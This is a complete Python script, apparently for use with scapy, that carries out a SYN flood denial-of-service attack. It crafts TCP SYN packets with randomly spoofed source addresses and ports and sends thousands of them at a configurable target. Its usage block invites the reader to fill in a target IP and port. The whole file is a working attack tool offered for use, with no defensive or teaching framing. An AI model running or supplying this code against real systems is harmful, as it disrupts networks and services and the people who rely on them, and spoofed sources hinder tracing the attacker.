from scapy.all import IP, TCP, send
import random

def generate_syn_packet(target_ip, target_port):
    """Generate a raw SYN packet with a spoofed source IP and port."""
    src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))  # Random spoofed IP
    src_port = random.randint(1236, 65535)  # Random high-numbered port

    # Craft SYN packet
    ip_layer = IP(src=src_ip, dst=target_ip)
    tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
    syn_packet = ip_layer / tcp_layer

    return syn_packet

def syn_flood(target_ip, target_port, packet_count=10000):
    """Send SYN flood packets to the target."""
    print(f"Starting SYN Flood on {target_ip}:{target_port} ...")

    for _ in range(packet_count):
        packet = generate_syn_packet(target_ip, target_port)
        send(packet, verbose=False)

    print("SYN Flood attack completed.")

# Usage example
if __name__ == "__main__":
    target_ip = "0.0.0.0"  # Change to your target IP
    target_port = 1234             # Change to target port
    syn_flood(target_ip, target_port)
